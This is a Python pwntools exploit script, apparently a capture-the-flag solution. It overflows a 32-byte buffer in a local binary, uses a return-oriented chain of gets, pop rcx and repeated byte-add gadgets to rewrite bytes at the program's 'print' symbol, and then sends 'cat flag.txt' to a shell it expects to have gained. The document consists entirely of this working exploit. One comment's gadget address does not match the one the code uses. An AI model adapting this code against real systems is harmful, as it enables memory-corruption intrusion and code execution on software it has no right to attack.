from pwn import *
import time

context.binary = elf = ELF("./vuln")
libc = ELF("./libc.so.6")
#conn = process()
conn = remote("localhost", 42123)

# 0x000000000040113b : add byte ptr [rcx], al ; pop rbp ; ret

pl = b""
pl += b"a"*32
pl += p64(elf.bss(0x40)) # writable memory

pl += p64(elf.sym.gets) # al = 4

pl += p64(0x40117e) # pop rcx
pl += p64(elf.sym.print + 1)
for n in range(3):
  pl += p64(0x40115b) # add
  pl += p64(elf.bss(0x40)) # writable memory

pl += p64(0x40117e) # pop rcx
pl += p64(elf.sym.print + 0)
for n in range(28):
  pl += p64(0x40115b) # add
  pl += p64(elf.bss(0x40)) # writable memory

pl += p64(elf.sym.gets) # set rax to -1
pl += p64(0x40117e) # pop rcx
pl += p64(elf.sym.print + 2)
for n in range(3):
  pl += p64(0x40115b) # add
  pl += p64(elf.bss(0x40)) # writable memory

pl += p64(0x40117f) # ret
pl += p64(elf.sym.main)

print(len(pl))
conn.sendline(pl)
time.sleep(1)
conn.sendline(b"aaa")
#time.sleep(1)
#conn.sendline(b"a")
time.sleep(1)
conn.sendline(b"cat flag.txt")

conn.interactive()
